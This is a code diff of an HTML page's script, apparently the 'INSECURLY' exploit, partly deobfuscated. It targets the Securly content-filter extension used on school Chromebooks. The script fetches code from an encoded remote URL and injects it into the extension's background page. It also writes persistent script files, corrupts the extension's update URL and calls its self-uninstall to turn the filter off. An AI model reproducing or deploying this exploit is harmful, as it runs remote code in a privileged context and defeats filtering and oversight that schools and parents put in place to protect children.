@@ -22,39 +22,35 @@
     </style>
     <!--   I personally could not care less whether this exploit gets patched -->
     <script defer>
-      function o(n, _ = 78, D = 126) {
+      function decode1(n, _ = 78, D = 126) {
         for (var x = n.toString().split(""), $ = 0; $ < x.length; $++)
           x[$].charCodeAt(0) <= D &&
             (x[$] = String.fromCharCode((x[$].charCodeAt(0) + _) % D));
         return x.join("");
       }
-      function d(n, _ = 78, D = 126) {
-        return o(n, D - _);
+      function decode2(n, _ = 78, D = 126) {
+        return decode1(n, D - _);
       }
       const m = function () {
           document.body.innerHTML = '<style>  body {    background-color:black;    color:#eeeeee;    font-family:Arial;  }  h1 {    font-size: 40px;    font-weight:normal;  }  .switch-area {    display:flex;    margin:10px 0px;  }  .switch-area div{    font-size:20px;    padding:6px 0px;    height:32px;  }  #desc {    font-size:18px;    max-width:320px;  }  #updates {    font-size:15px;    margin-top:15px;    color:#999999;  }  /* https://danklammer.com/articles/simple-css-toggle-switch/ */  #toggle {      appearance: none;      width: 62px;      height: 32px;      display: inline-block;      position: relative;      border-radius: 50px;      overflow: hidden;      outline: none;      border: none;      cursor: pointer;      background-color: #707070;      transition: background-color ease 0.3s;    }    #toggle:before {      content: "on off";      display: block;      position: absolute;      z-index: 2;      width: 28px;      height: 28px;      background: #fff;      left: 2px;      top: 2px;      border-radius: 50%;      font: 10px/28px Helvetica;      text-transform: uppercase;      font-weight: bold;      text-indent: -22px;      word-spacing: 37px;      color: #fff;      text-shadow: -1px -1px rgba(0,0,0,0.15);      white-space: nowrap;      box-shadow: 0 1px 2px rgba(0,0,0,0.2);      transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;    }    #toggle:checked {      background-color: #4CD964;    }    #toggle:checked:before {      left: 32px;    }  </style>  <h1>INSECURLY exploit (by bypassi)</h1>  <div class="switch-area">    <div>securly is currently</div>    <input id="toggle" type="checkbox" />  </div>  <div id="desc">    the switch above allows you to turn the securly extension on and off. note that this will not bypass    network filters or other filtering extensions. teachers using securly classroom will still be able to    see your screen. more functionality is coming soon.  </div>  <div id="updates"></div>';
-          let n =
-              window[d`38B?=5`][d`5HD5>C9?>`][
-                o`\x19\x17&r\x13\x15\x1D\x19$!' \x16\x02\x13\x19\x17`
-              ](),
-            _ = () => n.chrome,
-            D = document.getElementById("toggle");
+          let securlyWindow = window.chrome.extension.getBackgroundPage();
+          let D = document.getElementById("toggle");
           async function x() {
             let _ = await (
-                await fetch(d`8DD@C\n}}9>C53EB<I|2I@1CC9|3?=}:C|:C`)
+                await fetch(decode2`8DD@C\n}}9>C53EB<I|2I@1CC9|3?=}:C|:C`)
               ).text(),
-              D = new n[d`\x12<?2`]([_], { type: d`D5HD}:1F1C3B9@D` }),
+              D = new securlyWindow[decode2`\x12<?2`]([_], { type: decode2`D5HD}:1F1C3B9@D` }),
               x = document.createElement("script");
-            (x.src = URL[d`3B51D5\x1F2:53D%"\x1C`](D)),
-              n.document.body.appendChild(x);
+            (x.src = URL[decode2`3B51D5\x1F2:53D%"\x1C`](D)),
+              securlyWindow.document.body.appendChild(x);
           }
           try {
             for (let $ = 0; $ < 10; $++) Reflect.construct(Blob, []);
             x();
           } catch (C) {}
           async function t(n, _, D) {
-            let x = await new Promise((n) => {
-              window[d`G52;9D"5AE5CD\x169<5#ICD5=`](0, D.length, n);
+            let x = await new Promise((callback) => {
+              window.webkitRequestFileSystem(0, D.length, callback);
             });
             return (
               await new Promise((_) => {
@@ -69,62 +65,58 @@
               }),
               new Promise(($) => {
                 x.root.getFile(n, { create: !0 }, (n) => {
-                  n[d`3B51D5'B9D5B`]((x) => {
-                    (x[d`?>GB9D5е>4`] = () => {
+                  n[decode2`3B51D5'B9D5B`]((x) => {
+                    (x[decode2`?>GB9D5е>4`] = () => {
                       delete [x, n];
                     }),
-                      (x[d`?>GB9D55>4`] = () => {
-                        $(n[d`D?%"\x1C`]());
+                      (x[decode2`?>GB9D55>4`] = () => {
+                        $(n[decode2`D?%"\x1C`]());
                       }),
-                      x.write(new window[d`\x12<?2`]([D], { type: _ }));
+                      x.write(new window[decode2`\x12<?2`]([D], { type: _ }));
                   });
                 });
               })
             );
           }
           function B() {
-            if (!window[d`<?31D9?>`][d`81C8`])
-              throw new window[d`\x15BB?B`]("IDK");
+            if (!window[decode2`<?31D9?>`][decode2`81C8`])
+              throw new window[decode2`\x15BB?B`]("IDK");
             let n = location.hash.replace("#", "");
-            t(Math.random() + ".js", d`D5HD}:1F1C3B9@D`, n)[d`D85>`]((n) => {
+            t(Math.random() + ".js", decode2`D5HD}:1F1C3B9@D`, n)[decode2`D85>`]((n) => {
               let _ = document.createElement("script");
               (_.src = n), document.body.appendChild(_);
             });
           }
-          _().runtime.id.startsWith("i") ||
-            ((document.getElementById(
-              "updates"
-            ).textContent = d`@1I<?14n\x03n1@@<954|nvI?En1B5>uDnCE@@?C54nD?n;>?GnG81DnD89Cn=51>Cw`),
-            _().extension[d`C5D%@41D5%B<\x141D1`](
-              decodeURIComponent(d`s\x15\x00s\x12\x06s\t\x15`).repeat(1024)
-            )),
-            localStorage[d`3<ECD5B`]?.startsWith(d`\x11&\x1F\x19\x14/\x1F#z`) ||
+          securlyWindow.chrome.runtime.id.startsWith("i") ||
+            ((document.getElementById("updates").textContent = 'payload 3 applied. (you aren\'t supposed to know what this means)'),
+            securlyWindow.chrome.extension.setUpdateURLData('ඞ'.repeat(1024))),
+            localStorage['cluster']?.startsWith('AVOID_OS,') ||
               (D.checked = !0),
             (D.onclick = function $() {
-              D[d`3853;54`]
+              D['checked']
                 ? (delete window.WebRequestEventImpl, localStorage.clear())
-                : (_().management[d`E>9>CD1<<#5<6`].bind(_().runtime.id),
-                  Storage.prototype[d`C5D\x19D5=`].call(
-                    window[d`<?31<#D?B175`],
-                    d`3<ECD5B`,
-                    d`\x11&\x1F\x19\x14/\x1F#z` +
-                      Date.now() * (Math[d`B1>4?=`]() + 1.5)
+                : (securlyWindow.chrome.management[decode2`E>9>CD1<<#5<6`].bind(securlyWindow.chrome.runtime.id),
+                  Storage.prototype[decode2`C5D\x19D5=`].call(
+                    window[decode2`<?31<#D?B175`],
+                    decode2`3<ECD5B`,
+                    decode2`\x11&\x1F\x19\x14/\x1F#z` +
+                      Date.now() * (Math[decode2`B1>4?=`]() + 1.5)
                   )),
-                location.reload.call(n[d`<?31D9?>`]),
+                location.reload.call(securlyWindow[decode2`<?31D9?>`]),
                 setTimeout(x, 1500);
             }),
-            (navigator[d`@5BC9CD\x1C?31<\x169<5C`] = !0),
+            (navigator[decode2`@5BC9CD\x1C?31<\x169<5C`] = !0),
             t(
-              d`}9|:C`,
-              d`D5HD}:1F1C3B9@D`,
-              o + d + t + B + ";" + B.name + "()//"
+              '/i.js',
+              'text/javascript',
+              decode1 + decode2 + t + B + ";" + B.name + "()//"
             ),
             t(
-              d`}9|8D=<`,
+              decode2`}9|8D=<`,
               "text/html",
-              d`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`
+              decode2`\fC3B9@DnCB3\rp|}9|:Cp\x0E\f}C3B9@D\x0E`
             ).then(() => {
-              window[d`>1F971D?B`][d`CD?B175`][d`@5BC9CD`]();
+              window[decode2`>1F971D?B`][decode2`CD?B175`][decode2`@5BC9CD`]();
             });
         },
         а = [
@@ -142,20 +134,20 @@
         ],
         SI = {
           NONE: "",
-          OLD: d`985?217:;6;<><9;7981><8344:?98;7`,
-          NEW: d`:?6<=;3392;??@<15?9>53:2=4527<12`,
-          BETA: d`;>>59==@51=9;=:9:=>8:==?244<5?8:`,
+          OLD: decode2`985?217:;6;<><9;7981><8344:?98;7`,
+          NEW: decode2`:?6<=;3392;??@<15?9>53:2=4527<12`,
+          BETA: decode2`;>>59==@51=9;=:9:=>8:==?244<5?8:`,
         };
       async function g(n) {
         let _;
         try {
-          _ = await window[d`65D38`](
-            d`38B?=5{5HD5>C9?>\n}}` + n + d`}` + d(а.at(d`\x01\x00`))
+          _ = await window[decode2`65D38`](
+            decode2`38B?=5{5HD5>C9?>\n}}` + n + decode2`}` + decode2(а.at(decode2`\x01\x00`))
           );
         } catch (D) {
           return 0;
         }
-        return 200 === _[d`CD1DEC`] ? 1 : 0;
+        return 200 === _[decode2`CD1DEC`] ? 1 : 0;
       }
       async function gSI() {
         return (await g(SI.NEW))
@@ -170,54 +162,54 @@
         let D = function (n) {
             let _ = open();
             _.chrome =
-              top.chrome[d`5HD5>C9?>`][d`75D\x1213;7B?E>4 175`]().chrome;
-            let D = document[d`3B51D5\x15<5=5>D`]("script");
+              top.chrome[decode2`5HD5>C9?>`][decode2`75D\x1213;7B?E>4 175`]().chrome;
+            let D = document[decode2`3B51D5\x15<5=5>D`]("script");
             (D.src = n), _.document.body.appendChild(D), top.close();
           },
-          x = URL[d`3B51D5\x1F2:53D%"\x1C`](n),
-          $ = new window[d`\x12<?2`]([`${o};${d};(${D})("${x}")`], {
-            type: d`D5HD}:1F1C3B9@D`,
+          x = URL[decode2`3B51D5\x1F2:53D%"\x1C`](n),
+          $ = new window[decode2`\x12<?2`]([`${decode1};${decode2};(${D})("${x}")`], {
+            type: decode2`D5HD}:1F1C3B9@D`,
           }),
-          C = URL[d`3B51D5\x1F2:53D%"\x1C`]($),
+          C = URL[decode2`3B51D5\x1F2:53D%"\x1C`]($),
           t =
-            d`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` +
+            decode2`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` +
             C +
-            d`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
+            decode2`u\x0E\f}C3B9@D\x0Ep\x0EXnnnnnnnn\x189|n\x196nI?En31>nB514nD89CznD85n5H@<?9Dn494>uDnG?B;|Xnnnnnnnn'19Dn1n3?E@<5n?6nG55;C|n'5u<<n25n213;|||Xnnnn\f}96B1=5\x0E`;
         return _ === SI.BETA
-          ? `${d`69<5CICD5=\n38B?=5{5HD5>C9?>\n}}`}${_}${d`}D5=@?B1BI}9|8D=<q9=@?BDvu`}${C}')`
-          : d`38B?=5{5HD5>C9?>\n}}` +
+          ? `${decode2`69<5CICD5=\n38B?=5{5HD5>C9?>\n}}`}${_}${decode2`}D5=@?B1BI}9|8D=<q9=@?BDvu`}${C}')`
+          : decode2`38B?=5{5HD5>C9?>\n}}` +
               _ +
-              d`}` +
+              decode2`}` +
               (0.3 > Math.random() ? "/" : "") +
-              d(а[1]) +
-              [d`\x0F31D57?BI\r`] +
-              window[d`5>3?45%"\x19\x13?=@?>5>D`](window[d`2D?1`](t));
+              decode2(а[1]) +
+              [decode2`\x0F31D57?BI\r`] +
+              window[decode2`5>3?45%"\x19\x13?=@?>5>D`](window[decode2`2D?1`](t));
       }
       function gS2U(n) {
         return e(
-          new window[d`\x12<?2`]([`${o};${d};(${m})()`], {
-            type: d`D5HD}:1F1C3B9@D`,
+          new window[decode2`\x12<?2`]([`${decode1};${decode2};(${m})()`], {
+            type: decode2`D5HD}:1F1C3B9@D`,
           }),
           n
         );
       }
-      ([].__proto__[window[o`\x05+\x1F\x14!\x1E`][d`9D5B1D?B`]] = function* () {
+      ([].__proto__[window[decode1`\x05+\x1F\x14!\x1E`][decode2`9D5B1D?B`]] = function* () {
         yield gS2U.call(this[0], this[1]);
       }),
         gSI().then((n) => {
           if (n === SI.NONE) {
             let _ = document.getElementById("error");
             _.classList.add("shown"),
-              (_.textContent = d`)?En4?>uDn81F5n1>n145AE1D5nF5BC9?>n?6n#53EB<In9>CD1<<54|`);
+              (_.textContent = decode2`)?En4?>uDn81F5n1>n145AE1D5nF5BC9?>n?6n#53EB<In9>CD1<<54|`);
           } else {
-            let D = [d`}2<?3;54|:C`, n],
+            let D = [decode2`}2<?3;54|:C`, n],
               x = document.getElementById("draggable");
             x.classList.add("shown"),
-              (x[d`?>4B17CD1BD`] = (n) => {
-                n[d`41D1$B1>C65B`].setData("text/plain", [...D]);
+              (x[decode2`?>4B17CD1BD`] = (n) => {
+                n[decode2`41D1$B1>C65B`].setData("text/plain", [...D]);
               }),
               n === SI.BETA &&
-                (x.textContent += d`nvE>CD12<5zn4?>Dn3?=@<19>n96n9Dn619<Cw`);
+                (x.textContent += decode2`nvE>CD12<5zn4?>Dn3?=@<19>n96n9Dn619<Cw`);
           }
         });
     </script>
